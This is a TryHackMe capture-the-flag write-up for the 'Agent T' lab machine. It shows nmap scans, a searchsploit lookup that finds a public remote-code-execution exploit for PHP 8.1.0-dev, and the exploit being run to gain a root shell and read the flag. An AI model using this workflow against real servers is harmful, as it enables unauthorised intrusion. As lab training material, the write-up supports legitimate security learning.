---
title: "Agent T"
url: "/writeups/tryhackme/agent_t/"
summary: dreaming
tags:
- tryhackme
- linux
- php
---

![Agent T](/dreaming.png)

## Scanning
### nmap
Started with an `nmap` scan:

* TCP all ports
```bash
kali@kali:~/ctf/thm/agent_t$ sudo nmap -T4 -p- 10.10.49.137 -oA nmap/tcp_all_ports
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-14 21:06 EST
Nmap scan report for 10.10.49.137
Host is up (0.082s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
```
* TCP with scripts against found ports
```bash
kali@kali:~/ctf/thm/agent_t$ sudo nmap -sCV -p80 10.10.49.137 -oA nmap/tcp_def_scripts
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-14 21:07 EST
Nmap scan report for 10.10.49.137
Host is up (0.079s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
|_http-title:  Admin Dashboard
```
## Enumeration
### Web Page
Looks to be a simple Admin Dashboard with nothing really interesting found.
There are also a handful of links that lead to non-existent pages.
### searchsploit
```bash
kali@kali:~/ctf/thm/agent_t$ searchsploit PHP 8.1.0-dev
--------------------------------------------------------- -----------------------
 Exploit Title                                           |  Path
--------------------------------------------------------- -----------------------
...
PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution      | php/webapps/49933.py
...
```
Found an exploit for the version of PHP that is being used.
Can also be found here: https://www.exploit-db.com/exploits/49933
## Exploitation
Copied the found exploit locally and executed it.
```bash
kali@kali:~/ctf/thm/agent_t$ python3 exploit.py 
Enter the full host url:
http://10.10.49.137/

Interactive shell is opened on http://10.10.49.137/ 
Can't acces tty; job crontol turned off.
$ whoami
root
```
And a interactive shell is given back.
The flag can then be found.
### Flag
```bash
$ cat /flag.txt
flag{4127d0530abf16d6...}
```
